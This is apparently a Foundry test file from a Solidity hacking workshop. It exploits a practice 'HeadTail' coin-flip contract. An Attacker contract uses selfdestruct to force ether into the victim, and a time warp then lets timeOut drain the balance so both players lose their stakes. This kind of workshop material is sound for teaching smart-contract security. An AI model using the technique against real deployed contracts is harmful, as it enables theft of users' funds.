// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {HeadTail} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise5_HeadTail is Test {
    HeadTail public headTail;
    address partyA = vm.addr(1);
    Attacker attacker = new Attacker();

    function setUp() public {
        vm.startPrank(partyA);
        vm.deal(partyA, 1 ether);
        headTail = new HeadTail{value: 1 ether}(
            keccak256(abi.encodePacked(false, uint256(123456)))
        );
        vm.stopPrank();
    }

    // partyB or attacker can call timeOut function before even guessing
    // can make the balance of HeadTail contract as 2 ether by using selfdestruct() in other contract
    // and partyA as well as partyB lost their money
    function test_timeOut() public {
        vm.deal(address(this), 1 ether);
        address(attacker).call{value: 1 ether}("");
        attacker.attack(address(headTail));
        // setting block.timestamp;
        vm.warp(1000000);
        headTail.timeOut();
        require(address(headTail).balance == 0, "invalid contract balance");
    }
}

contract Attacker {
    function attack(address _victim) external {
        selfdestruct(payable(_victim));
    }

    fallback() external payable {}
}
